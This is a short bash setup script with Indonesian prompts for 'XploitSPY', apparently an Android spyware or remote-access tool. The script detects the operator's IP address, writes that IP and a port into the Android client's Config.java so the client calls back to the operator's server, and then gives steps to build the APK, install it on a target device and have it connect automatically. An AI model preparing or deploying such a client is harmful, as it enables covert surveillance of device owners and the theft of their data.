#!/bin/bash

# Quick Config Script untuk Android Client

echo "========================================="
echo "   XploitSPY - Android Client Config"
echo "========================================="
echo ""

# Get server IP
echo "Mendeteksi IP server..."
SERVER_IP=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)

if [ -z "$SERVER_IP" ]; then
    SERVER_IP=$(ipconfig getifaddr en0 2>/dev/null)
fi

if [ -z "$SERVER_IP" ]; then
    read -p "Masukkan IP Server: " SERVER_IP
else
    echo "IP Server terdeteksi: $SERVER_IP"
    read -p "Gunakan IP ini? (y/n) [y]: " confirm
    confirm=${confirm:-y}
    if [[ ! $confirm =~ ^[Yy]$ ]]; then
        read -p "Masukkan IP Server: " SERVER_IP
    fi
fi

# Get server port
read -p "Masukkan Server Port [3000]: " SERVER_PORT
SERVER_PORT=${SERVER_PORT:-3000}

echo ""
echo "Konfigurasi:"
echo "  Server IP: $SERVER_IP"
echo "  Server Port: $SERVER_PORT"
echo ""

# Update Config.java
CONFIG_FILE="../client/app/src/main/java/com/xploitspy/client/Config.java"

if [ ! -f "$CONFIG_FILE" ]; then
    echo "❌ File Config.java tidak ditemukan!"
    exit 1
fi

# Backup original
cp "$CONFIG_FILE" "$CONFIG_FILE.bak"

# Update config
sed -i '' "s|http://YOUR_SERVER_IP:80|http://$SERVER_IP:$SERVER_PORT|g" "$CONFIG_FILE"
sed -i '' "s|http://.*:.*|http://$SERVER_IP:$SERVER_PORT|g" "$CONFIG_FILE"

echo "✅ Config.java telah diupdate!"
echo ""
echo "File: $CONFIG_FILE"
echo ""
echo "Selanjutnya:"
echo "1. Build APK dengan Android Studio atau:"
echo "   cd ../client && ./gradlew assembleRelease"
echo ""
echo "2. Install APK di Android device"
echo ""
echo "3. Device akan otomatis connect ke server"
echo ""

